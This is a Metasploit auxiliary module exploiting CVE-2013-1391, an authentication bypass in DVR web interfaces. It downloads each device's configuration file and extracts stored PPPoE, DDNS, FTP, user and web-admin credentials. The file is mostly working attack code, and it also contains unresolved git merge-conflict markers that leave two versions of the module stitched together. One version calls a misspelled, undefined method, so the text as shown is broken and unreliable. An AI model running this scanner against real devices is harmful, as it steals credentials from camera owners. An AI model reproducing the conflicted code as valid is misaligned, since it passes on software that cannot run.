##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

<<<<<<< HEAD
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Multiple DVR Manufacturers Configuration Disclosure',
			'Description' => %q{
					This module takes advantage of an authentication bypass vulnerability at the
				web interface of multiple manufacturers DVR systems, which allows to retrieve the
				device configuration.
			},
			'Author'      =>
				[
					'Alejandro Ramos', # Vulnerability Discovery
					'juan vazquez' # Metasploit module
				],
			'References'  =>
				[
					[ 'CVE', '2013-1391' ],
					[ 'URL', 'http://www.securitybydefault.com/2013/01/12000-grabadores-de-video-expuestos-en.html' ]
				],
			'License'     => MSF_LICENSE
		)

	end

	def get_pppoe_credentials(conf)

		user = ""
		password = ""
		enabled = ""

		if conf =~ /PPPOE_EN=(\d)/
			enabled = $1
		end

		return if enabled == "0"

		if conf =~ /PPPOE_USER=(.*)/
			user = $1
		end

		if conf =~ /PPPOE_PASSWORD=(.*)/
			password = $1
		end

		if user.empty? or password.empty?
			return
		end

		info = "PPPOE credentials for #{rhost}, user: #{user}, password: #{password}"

		report_note({
			:host   => rhost,
			:data   => info,
			:type   => "dvr.pppoe.conf",
			:sname  => 'pppoe',
			:update => :unique_data
		})

	end


	def get_ddns_credentials(conf)
		hostname = ""
		user = ""
		password = ""
		enabled = ""

		if conf =~ /DDNS_EN=(\d)/
			enabled = $1
		end

		return if enabled == "0"

		if conf =~ /DDNS_HOSTNAME=(.*)/
			hostname = $1
		end

		if conf =~ /DDNS_USER=(.*)/
			user = $1
		end

		if conf =~ /DDNS_PASSWORD=(.*)/
			password = $1
		end

		if hostname.empty?
			return
		end

		info = "DDNS credentials for #{hostname}, user: #{user}, password: #{password}"
		
		vprint_good("#{rhost}: Found #{info}")
		report_note({
			:host   => rhost,
			:data   => info,
			:type   => "dvr.ddns.conf",
			:sname  => 'ddns',
			:update => :unique_data
		})

	end

	def get_ftp_credentials(conf)
		server = ""
		user = ""
		password = ""
		port = ""

		if conf =~ /FTP_SERVER=(.*)/
			server = $1
		end

		if conf =~ /FTP_USER=(.*)/
			user = $1
		end

		if conf =~ /FTP_PASSWORD=(.*)/
			password = $1
		end

		if conf =~ /FTP_PORT=(.*)/
			port = $1
		end

		if server.empty?
			return
		end

		vprint_good("#{rhost}: Found FTP_USER #{user}:#{password}")
		report_auth_info({
			:host         => server,
			:port         => port,
			:sname        => 'ftp',
			:duplicate_ok => false,
			:user         => user,
			:pass         => password
		})
	end

	def get_dvr_credentials(conf)
		conf.scan(/USER(\d+)_USERNAME/).each { |match|
			user = ""
			password = ""
			active = ""

			user_id = match[0]

			if conf =~ /USER#{user_id}_LOGIN=(.*)/
				active = $1
			end

			if conf =~ /USER#{user_id}_USERNAME=(.*)/
				user = $1
			end

			if conf =~ /USER#{user_id}_PASSWORD=(.*)/
				password = $1
			end

			if active == "0"
				user_active = false
			else
				user_active = true
			end

			vprint_good("#{rhost}: Found USER #{user}:#{password}")
			report_auth_info({
				:host         => rhost,
				:port         => rport,
				:sname        => 'dvr',
				:duplicate_ok => false,
				:user         => user,
				:pass         => password,
				:active       => user_active
			})
		}
	end

	def get_web_credentials(conf)
		# search for web_admin
		if conf =~ /WEB_ADMIN/
			user = ""
			password = ""

			if conf =~ /WEB_ADMIN_ID=(.*)/
				user = $1
			end

			if conf =~ /WEB_ADMIN_PWD=(.*)/
				password = $1
			end

			unless user.empty?
				vprint_good("#{rhost}: Found WEB_ADMIN #{user}:#{password}")
				report_auth_info({
					:host         => rhost,
					:port         => '80',
					:sname        => 'dvr_web',
					:duplicate_ok => false,
					:user         => user,
					:pass         => password
				})
			end
		end

		conf.scan(/WEB_USER(\d+)/).each { |match|
			user = ""
			password = ""

			user_id = match[0]

			if conf =~ /WEB_USER#{user_id}=(.*)/
				user = $1
			end

			if conf =~ /WEB_PASSWD#{user_id}=(.*)/
				password = $1
			end

			unless user.empty?
				vprint_good("#{rhost}: Found WEB_USER #{user}:#{password}")
				report_auth_info({
					:host         => rhost,
					:port         => '80',
					:sname        => 'dvr_web',
					:duplicate_ok => false,
					:user         => user,
					:pass         => password
				})
			end
		}
	end

	def run_host(ip)

		res = send_request_cgi({
			'uri'          => '/DVR.cfg',
			'method'       => 'GET'
		})

		if not res or res.code != 200 or res.body.empty? or res.body !~ /CAMERA/
			vprint_error("#{rhost}:#{rport} - DVR configuration not found")
			return
		end

		conf = res.body

		#remove \0 that returns by some DVR
		conf.gsub!(/\u0000/,'')

		p = store_loot("dvr.configuration", "text/plain", rhost, conf, "DVR.cfg")
		vprint_good("#{rhost}:#{rport} - DVR configuration stored in #{p}")

		get_ftp_credentials(conf)
		get_dvr_credentials(conf)
		get_ddns_credentials(conf)
		get_ppooe_credentials(conf)
		get_web_credentials(conf)

		dvr_name = ""
		if conf =~ /DVR_NAME=(.*)/
			dvr_name = $1
		end

		report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => "DVR NAME: #{dvr_name}")
		print_good("#{rhost}:#{rport} DVR #{dvr_name} found")
	end
=======
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Multiple DVR Manufacturers Configuration Disclosure',
      'Description' => %q{
          This module takes advantage of an authentication bypass vulnerability at the
        web interface of multiple manufacturers DVR systems, which allows to retrieve the
        device configuration.
      },
      'Author'      =>
        [
          'Alejandro Ramos', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'References'  =>
        [
          [ 'CVE', '2013-1391' ],
          [ 'URL', 'http://www.securitybydefault.com/2013/01/12000-grabadores-de-video-expuestos-en.html' ]
        ],
      'License'     => MSF_LICENSE
    )

  end

  def get_pppoe_credentials(conf)

    user = ""
    password = ""
    enabled = ""

    if conf =~ /PPPOE_EN=(\d)/
      enabled = $1
    end

    return if enabled == "0"

    if conf =~ /PPPOE_USER=(.*)/
      user = $1
    end

    if conf =~ /PPPOE_PASSWORD=(.*)/
      password = $1
    end

    if user.empty? or password.empty?
      return
    end

    info = "PPPOE credentials for #{rhost}, user: #{user}, password: #{password}"

    report_note({
      :host   => rhost,
      :data   => info,
      :type   => "dvr.pppoe.conf",
      :sname  => 'pppoe',
      :update => :unique_data
    })

  end


  def get_ddns_credentials(conf)
    hostname = ""
    user = ""
    password = ""
    enabled = ""

    if conf =~ /DDNS_EN=(\d)/
      enabled = $1
    end

    return if enabled == "0"

    if conf =~ /DDNS_HOSTNAME=(.*)/
      hostname = $1
    end

    if conf =~ /DDNS_USER=(.*)/
      user = $1
    end

    if conf =~ /DDNS_PASSWORD=(.*)/
      password = $1
    end

    if hostname.empty?
      return
    end

    info = "DDNS credentials for #{hostname}, user: #{user}, password: #{password}"

    report_note({
      :host   => rhost,
      :data   => info,
      :type   => "dvr.ddns.conf",
      :sname  => 'ddns',
      :update => :unique_data
    })

  end

  def get_ftp_credentials(conf)
    server = ""
    user = ""
    password = ""
    port = ""

    if conf =~ /FTP_SERVER=(.*)/
      server = $1
    end

    if conf =~ /FTP_USER=(.*)/
      user = $1
    end

    if conf =~ /FTP_PASSWORD=(.*)/
      password = $1
    end

    if conf =~ /FTP_PORT=(.*)/
      port = $1
    end

    if server.empty?
      return
    end

    report_auth_info({
      :host         => server,
      :port         => port,
      :sname        => 'ftp',
      :duplicate_ok => false,
      :user         => user,
      :pass         => password
    })
  end

  def get_dvr_credentials(conf)
    conf.scan(/USER(\d+)_USERNAME/).each { |match|
      user = ""
      password = ""
      active = ""

      user_id = match[0]

      if conf =~ /USER#{user_id}_LOGIN=(.*)/
        active = $1
      end

      if conf =~ /USER#{user_id}_USERNAME=(.*)/
        user = $1
      end

      if conf =~ /USER#{user_id}_PASSWORD=(.*)/
        password = $1
      end

      if active == "0"
        user_active = false
      else
        user_active = true
      end

      report_auth_info({
        :host         => rhost,
        :port         => rport,
        :sname        => 'dvr',
        :duplicate_ok => false,
        :user         => user,
        :pass         => password,
        :active       => user_active
      })
    }
  end

  def run_host(ip)

    res = send_request_cgi({
      'uri'          => '/DVR.cfg',
      'method'       => 'GET'
    })

    if not res or res.code != 200 or res.body.empty? or res.body !~ /CAMERA/
      vprint_error("#{rhost}:#{rport} - DVR configuration not found")
      return
    end

    p = store_loot("dvr.configuration", "text/plain", rhost, res.body, "DVR.cfg")
    vprint_good("#{rhost}:#{rport} - DVR configuration stored in #{p}")

    conf = res.body

    get_ftp_credentials(conf)
    get_dvr_credentials(conf)
    get_ddns_credentials(conf)
    get_pppoe_credentials(conf)

    dvr_name = ""
    if res.body =~ /DVR_NAME=(.*)/
      dvr_name = $1
    end

    report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => "DVR NAME: #{dvr_name}")
    print_good("#{rhost}:#{rport} DVR #{dvr_name} found")
  end
>>>>>>> 72da8299a503c819a113428d7b1f3d7b240c2a69

end
